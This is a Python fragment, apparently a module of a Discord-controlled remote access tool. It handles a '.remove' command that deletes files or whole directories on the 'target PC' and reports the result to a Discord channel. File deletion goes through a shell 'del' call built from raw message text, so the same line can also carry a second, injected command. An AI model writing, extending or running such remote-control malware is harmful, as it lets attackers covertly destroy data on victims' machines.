import os
from shutil import copy2, rmtree
from resources.misc import *
import subprocess
# end of imports

# on message
elif message.content[:7] == '.remove':
    await message.delete()
    if message.channel.id == channel_ids['file']:
        if message.content.strip() == '.remove':
            reaction_msg = await message.channel.send('```Syntax: .remove <file-or-directory>```'); await reaction_msg.add_reaction('🔴')
        else:
            if os.path.exists('/'.join(working_directory) + '/' + message.content[8:]):
                try:
                    if os.path.isfile('/'.join(working_directory) + '/' + message.content[8:]):
                        subprocess.run('del "' + '\\'.join(working_directory) + '\\' + message.content[8:] + '"', shell=True)
                    else:
                        rmtree('/'.join(working_directory) + '/' + message.content[8:])
                    reaction_msg = await message.channel.send('```Successfully removed  ' + '/'.join(working_directory) + '/' + message.content[8:] + '  from target PC```'); await reaction_msg.add_reaction('🔴')
                except Exception as error:
                    reaction_msg = await message.channel.send('`' + str(error) + '`'); await reaction_msg.add_reaction('🔴')
            else:
                reaction_msg = await message.channel.send('```❗ File or directory not found.```'); await reaction_msg.add_reaction('🔴')
    else:
        reaction_msg = await message.channel.send('||-||\n❗`This command works only on file-related channel:` <#' + str(channel_ids['file']) + '>❗\n||-||'); await reaction_msg.add_reaction('🔴')
